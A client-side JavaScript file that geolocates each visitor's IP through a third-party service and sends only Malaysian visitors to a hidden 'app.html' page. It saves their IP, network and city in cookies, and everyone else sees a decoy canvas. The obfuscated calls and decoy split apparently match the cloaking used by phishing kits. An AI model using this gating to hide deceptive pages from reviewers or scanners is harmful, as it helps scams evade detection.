var privacypolicy = "policy.html";
var applink = "app.html?ver=" + Math.random();
var opc = "*";
negara = ["MY"];
op = ["abc", "def"];
var now = new Date().toLocaleString();

function stop() {
    throw new Error('LOG ERROR!')
}

function setCookie(cname, cvalue, exdays) {
    const d = new Date();
    d.setTime(d.getTime() + (exdays * 1 * 60 * 60 * 1000));
    let expires = "expires=" + d.toUTCString();
    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

function getCookie(cname) {
    var name = cname + "=";
    var decodedCookie = decodeURIComponent(document.cookie);
    var ca = decodedCookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return "";
}

if (getCookie('ip') == '') {
    // $.get("https://ipinfo.io/json", function (response) {
    //    var country = response.country;
    //    var org = response.org;
    $.get("https://json.geoiplookup.io/", function(response) {
        var country = response.country_code;
        var org = response.asn;

        var city = response.city;
        var ua = navigator.userAgent.toLowerCase();
        var ipp = response.ip;

        function opcek(op) {
            if (opc === '*') {
                return true;
            } else {
                return org.includes(op);
            }
        }
        if (negara.includes(country) && op.some(opcek) === true) {
            document['getElementById']('errorpage')['style']['display'] = 'none';
            document['getElementById']('canvas')['style']['display'] = 'none';
            document['getElementById']('loading')['style']['display'] = 'block';
            setCookie('ip', ipp, '1');
            setCookie('org', org, '1');
            setCookie('country', country, '1');
            setCookie('city', city, '1');
            location['assign'](applink);
        } else {
            document['getElementById']('errorpage')['style']['display'] = 'none';
            document['getElementById']('canvas')['style']['display'] = 'block';
            document['getElementById']('loading')['style']['display'] = 'none';
        }
    }, 'jsonp')['fail'](function() {
        document['getElementById']('loading')['style']['display'] = 'none';
        document['getElementById']('errorpage')['style']['display'] = 'block';
        stop();
    })
} else {
    document['getElementById']('errorpage')['style']['display'] = 'none';
    document['getElementById']('canvas')['style']['display'] = 'none';
    document['getElementById']('loading')['style']['display'] = 'block';
    location['assign'](applink);
}